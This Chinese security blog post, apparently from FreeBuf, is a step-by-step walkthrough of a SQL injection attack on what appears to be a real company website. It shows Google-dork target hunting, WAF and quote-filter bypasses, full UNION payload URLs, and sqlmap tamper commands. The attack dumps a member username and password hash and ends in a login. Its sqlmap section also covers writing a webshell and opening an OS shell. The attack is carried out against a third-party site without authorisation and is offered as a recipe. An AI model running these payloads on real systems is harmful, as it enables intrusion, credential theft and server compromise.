**下面我将分享一下我从找漏洞开始到拿到用户名密码为止的每一步详细思路和步骤，以供大家交流学习。**

## 寻找注入点

这一部分其实对于我这种刚学基础的小白是最难的，很长一段时间就在盲目的换网站，测试，扫描，不行就换下一个, 我推荐大家使用google
hacking，其实就是高级搜索语言，我总结几个最简单最常用的用法。

 **intext:**

寻找 **正文中** 含有关键字的网页

> 例如：intext:后台登录 将只返回正文中包含 “后台登录” 的网页

 **intitle:**

寻找 **标题中** 含有关键字的网页

> 例如：intitle:登录 将只返回标题中包含”登录”的网页

 **inurl：**

将返回 **url中** 含有关键词的网页

> 例如：inurl:Login 将返回url中含有 Login 的网页

 **site:**

指定访问的 **站点**

> 例如： site:baidu.com inurl:Login 将只在baidu.com 中查找url中含有 Login的网页

![1569379527_5d8ad4c784ac5.png!small](https://image.3001.net/images/20190925/1569379527_5d8ad4c784ac5.png!small)![1569379527_5d8ad4c78a36d.png!small](https://image.3001.net/images/20190925/1569379527_5d8ad4c78a36d.png!small)

Google hacking
既然有google当然用google最好了，百度上...emmmmm...反正我和我身边的同学加起来几天就找到两个注入点，google我在一页就找到好几个，当然大部分我都注入不进去，不过我还是推荐大家用firefox或者chrome的代理插件，比如...百度一下就有，然后在[www.google.com](http://www.google.com/)上使用google
hacking如inurl:?id=1查找，搜出来的网站下面绿色的网址会被google过滤一遍，找到自己需要的格式的网址就比较方便，如下图的第二个网站看起来就比较好注入。

![1569386869_5d8af17560717.jpg!small](https://image.3001.net/images/20190925/1569386869_5d8af17560717.jpg!small)

之前的都是做准备, 现在的才是正题。

这里随便拿个公司举个例子吧, url:
[http://www.xxxxxxx.com/en/company.php?id=35](http://www.shsuna.com/en/company.php?id=35)

进入网站之后，用单引号试一下。

![1571843032_5db06bd813439.png!small](https://image.3001.net/images/20191023/1571843032_5db06bd813439.png!small)

看到这行报错，绝对路径都爆出来了，看来有戏。

![1571843041_5db06be157867.png!small](https://image.3001.net/images/20191023/1571843041_5db06be157867.png!small)

试一下 ?id=35 and 1=1 出现waf (Web应用防护系统, 也称：网站应用级入侵防御系统 。英文：Web Application
Firewall，简称: WAF)

![1571843045_5db06be5e5601.png!small](https://image.3001.net/images/20191023/1571843045_5db06be5e5601.png!small)

猜测是刚才的空格被过滤了，于是试试用连接符代替空格, ?id=35+and+1=1

    
    
    [后台执行]: SELECT xxx FROM sanying WHERE id=35 and 1=1

因为 1 and 1 = 1 所以实际上是执行了 SELECT xxx FROM sanying

![1571843053_5db06bedd21e1.png!small](https://image.3001.net/images/20191023/1571843053_5db06bedd21e1.png!small)

页面返回正常，试试?id=35+and+1=2 发现返回空白页面。

    
    
    [后台执行]: SELECT xxx FROM sanying WHERE id=35 and 1=2        

1 and 2 = 0

没有语法错误但是逻辑判断为假, 所以返回错误。

![1571843059_5db06bf38b9bf.png!small](https://image.3001.net/images/20191023/1571843059_5db06bf38b9bf.png!small)

好的，确认找到注入点。

##  **找到了注入点之后就有两种方法了，手工和** **SQLmap**

###  **手工注入**

> <http://www.shsuna.com/en/company.php?id=-35+order+by+1--+>
>
> <http://www.shsuna.com/en/company.php?id=-35+order+by+2--+>

Orderby1返回正常，orderby2返回错误页面，发现列数为1

[说明]:

Order by 是用于排序的，后面的数字代表列数，我们这里可以用来检测列数。

Order by 1 第一列进行排序

......

Order by 10 错误，就表示没有第十列，所以一共有9列。

> <http://www.shsuna.com/en/company.php?id=-35+union+select+1--+>

###  **找到字段位置**

[后台执行]:

    
    
    SELECT xxx FROM sanying WHERE id=-35 UNION SELECT 1

(UNION 联合查询，用于合并两个或多个SELECT语句的结果集)

Id=-35逻辑判断为假，所以为0，语句就变成了使用联合查询来寻找显示位。

(显示位: 在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位)

![1571843067_5db06bfbd18e6.png!small](https://image.3001.net/images/20191023/1571843067_5db06bfbd18e6.png!small)

使用mysql默认表名爆数据库名，调整limit 0,1(0是指查询从0开始, 1指一个长度)

Mysql默认数据库:

  

    
    
    information_schema 是根节点，其子节点有三个（SCHEMATA, TABLES, COLUMNS）,
    SCHEMATA的子节点有一个（SCHEMA_NAME）,
    TABLES的子节点有两个（TABLE_SCHEMA, TABLE_NAME）,
    COLUMNS的子节点有三个（TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME）

  

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+schema_name+from+information_schema.schemata+limit+0,1--+>
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+schema_name+from+information_schema.schemata+limit+1,1--+>
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+schema_name+from+information_schema.schemata+limit+2,1--+>

[说明]:

    
    
    SELECT xxx FROM sanying WHERE id=-35 UNION SELECT schema_name FROM information_schema.schemata LIMIT 0,1 

目的就是寻找默认数据库information_schema中，表schemata内，列schema_name里面存储的字段，该字段有数据库内的所有的数据库名，通过函数limit
m,n挨个查询

得到三个数据库名。

> information_schema
>
> sanying
>
> testserver8800

![1571843075_5db06c037f966.png!small](https://image.3001.net/images/20191023/1571843075_5db06c037f966.png!small)

试了一下

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+TABLE_NAME+from+information_schema.TABLES+where+TABLE_SCHEMA=%27sanying%27+limit+0,1--+>

用了where+TABLE_SCHEMA=’sanying’ 限定数据库，发现页面没动静，再三确认没写错之后, 应该是单引号被过滤了，于是考虑用
database()代替，但是这样只能得到当前数据库的信息， **可以使用十六进制绕过, 即用十六进制代替引号内的内容** ，如sanying
的十六进制为73616e79696e67。

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+TABLE_NAME+from+information_schema.TABLES+where+>
> **TABLE_SCHEMA=0x73616e79696e67** +limit+0,1--+

(十六进制完整部分请看下一个大标题)

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+TABLE_NAME+from+information_schema.TABLES+where+TABLE_SCHEMA=database>()+limit+0,1--+
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+TABLE_NAME+from+information_schema.TABLES+where+TABLE_SCHEMA=database>()+limit+1,1--+
>
> ......
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+TABLE_NAME+from+information_schema.TABLES+where+TABLE_SCHEMA=database>()+limit+16,1--+

手动跑完17个payload得到17个表名。

table:

> db_down
>
> db_field
>
> db_files
>
> db_index_images
>
> db_jobs
>
> db_manage
>
> db_member
>
> db_menu
>
> db_message
>
> db_my_ads
>
> db_my_links
>
> db_news
>
> title
>
> db_products
>
> db_record
>
> db_reservation
>
> db_singlepage
>
> db_web_class

![1571843081_5db06c0992a69.png!small](https://image.3001.net/images/20191023/1571843081_5db06c0992a69.png!small)

观察当前数据库里面的表名，猜测db_member表里面保存用户信息，于是直接构造联合查询开始猜解。

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+username+from+sanying.db_member+limit+0,1--+>
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+password+from+sanying.db_member+limit+0,1--+>

猜解出username、password这两个关键字段。

![1571843088_5db06c10a0da4.png!small](https://image.3001.net/images/20191023/1571843088_5db06c10a0da4.png!small)

得到username: aaaaaa

Password: 0b4e7a0e5fe[马赛克]b5f95b9ceeac79

密码为aa[马赛克]a的哈希

![1571843094_5db06c16dd31f.png!small](https://image.3001.net/images/20191023/1571843094_5db06c16dd31f.png!small)

![1569388793_5d8af8f98730a.png!small](https://image.3001.net/images/20190925/1569388793_5d8af8f98730a.png!small)

可直接登陆成功。

##  **十六进制绕过方法**

因为要用到where+TABLE_SCHEMA=’库名’ 而单引号被过滤了，所以可以使用库名的十六进制代替。

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+TABLE_NAME+from+information_schema.TABLES+where+>
> **TABLE_SCHEMA=0x73616e79696e67** +limit+0,1--+

Hex(sanying) = 73616e79696e67

![1571843106_5db06c2256121.png!small](https://image.3001.net/images/20191023/1571843106_5db06c2256121.png!small)

>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+COLUMN_NAME+from+information_schema.COLUMNS+where+TABLE_SCHEMA=0x73616e79696e67+and+>
> **TABLE_NAME=0x64625f6d656d626572** +limit+0,1--+
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+COLUMN_NAME+from+information_schema.COLUMNS+where+TABLE_SCHEMA=0x73616e79696e67+and+>
> **TABLE_NAME=0x64625f6d656d626572** +limit+1,1--+
>
> ......
>
>
> <http://www.shsuna.com/en/company.php?id=-35+union+select+COLUMN_NAME+from+information_schema.COLUMNS+where+TABLE_SCHEMA=0x73616e79696e67+and+>
> **TABLE_NAME=0x64625f6d656d626572** +limit+4,1--+

可以依次得到字段id、username、password、email、time

> Hex(db_member) = 64625f6d656d626572

![1571843111_5db06c27a69e4.png!small](https://image.3001.net/images/20191023/1571843111_5db06c27a69e4.png!small)

> <http://www.shsuna.com/en/company.php?id=-35+union+select+> **列**
> +from+sanying.db_member+limit+0,1--+

用username、password替换加粗部分，得到用户名及密码。

(经测试concat()和group_concat()会触发waf，否则可以使用concat(str1,str2...)将多个字符串连接成一个字符串)

##  **SQLmap方法**

由于之前已经知道了是过滤空格，所以tamper用 space2morehash.py 这个脚本

 **batch** : 要求不对目标写入 # 防止删改数据库

 **tamper:** 使用干预脚本

 **-v 3** # 3为等级3, 不使用等级3无法继续下一步操作

### 常用脚本

 **space2morehash.py**

> 作用：将空格替换为#，并添加一个随机字符串和换行符  
> 使用脚本前：tamper('1 AND 9227=9227')  
> 使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227

 **space2hash.py**

> 作用 : 空格替换为#号 随机字符串 以及换行符

 **base64encode.py**

> 作用：替换为base64编码
>
> 使用脚本前：tamper("1' AND SLEEP(5)#")
>
> 使用脚本后：MScgQU5EIFNMRUVQKDUpIw==

 **charencode.py**

> 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）
>
> 使用脚本前：tamper('SELECT FIELD FROM%20TABLE')
>
> 使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

更多常用tamper脚本可以参考<https://blog.csdn.net/qq_34444097/article/details/82717357>

使用方法: sqlmap.py -u "<http://www.xx.com/a.asp?id=123>" -v 3 --dbs --batch
--tamper "脚本"

sqlmap -u <http://www.shsuna.com/en/company.php?id=37>-v 3 --dbs --batch
--tamper "space2morehash.py"

> 得到数据库

![1571843289_5db06cd98af0e.png!small](https://image.3001.net/images/20191023/1571843289_5db06cd98af0e.png!small)

sqlmap -u <http://www.shsuna.com/en/company.php?id=37>-v 3 -D sanying --tables
--batch --tamper "space2morehash.py"

> 得sanying的表

![1571843165_5db06c5d85c9e.png!small](https://image.3001.net/images/20191023/1571843165_5db06c5d85c9e.png!small)

sqlmap -u <http://www.shsuna.com/en/company.php?id=37>-v 3 -D sanying -T
db_member --columns --batch --tamper "space2morehash.py"

> 得bd_member的字段

![1571843165_5db06c5d86a5c.png!small](https://image.3001.net/images/20191023/1571843165_5db06c5d86a5c.png!small)

sqlmap -u <http://www.shsuna.com/en/company.php?id=37>-v 3 -D sanying -T
db_member -C username,password --dump --batch --tamper "space2morehash.py"

> 得账户密码

![1569389881_5d8afd3951aa1.jpg!small](https://image.3001.net/images/20190925/1569389881_5d8afd3951aa1.jpg!small)

后面的过程就是获取数据库基本信息的常规思路,

> 得到数据库 sqlmap -u “这里是url” --dbs
>
> 得到表 sqlmap -u “这里是url” -D 上面得到的任意库名 --tables
>
> 得到字段 sqlmap -u “这里是url” -D 库名 -T 上面得到的任意表 --columns # 这里能看到如
> username,password
>
> 得到数据 sqlmap -u “这里是url” -D 库名 -T 表 -C username,password --dump

![1569389418_5d8afb6ac58cc.png!small](https://image.3001.net/images/20190925/1569389418_5d8afb6ac58cc.png!small)

发现可以成功登陆。

##  **SQLmap基础用法**

###  **基本格式**

> sqlmap -u “<http://www.vuln.cn/post.php?id=1>”
>
> 默认使用level1检测全部数据库类型
>
> sqlmap -u “<http://www.vuln.cn/post.php?id=1>” --dbms mysql --level 3
>
> 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

###  **cookie注入**

> 当程序有防get注入的时候，可以使用cookie注入  
> sqlmap -u “<http://www.baidu.com/shownews.asp>” --cookie “id=11” --level
> 2（只有level达到2才会检测cookie）
>
> 从post数据包中注入,可以使用burpsuite或者temperdata等工具来抓取post包
>
> sqlmap -r “c:\tools\request.txt” -p “username” --dbms mysql 指定username参数

### 读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

> \--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）  
> \--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）  
> \--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径  
> #示例：  
> sqlmap -r “c:\request.txt” -p id --dbms mysql --file-dest
> “e:\php\htdocs\dvwa\inc\include\1.php” --file-write “f:\webshell\1112.php”

使用shell命令：

sqlmap -r “c:\tools\request.txt” -p id --dbms mysql --os-shell  
接下来指定网站可写目录：  
“E:\php\htdocs\dvwa”

#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）

sqlmap详细命令：

> \--is-dba 当前用户权限（是否为root权限）
>
> \--dbs 所有数据库
>
> \--current-db 网站当前数据库
>
> \--users 所有数据库用户
>
> \--current-user 当前数据库用户
>
> \--random-agent 构造随机user-agent
>
> \--passwords 数据库密码
>
> \--proxy [http://local:8080](http://local:8080/)–threads 10 (可以自定义线程加速) 代理
>
> \--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

 ***本文作者：opang哦胖，转载请注明来自FreeBuf.COM**

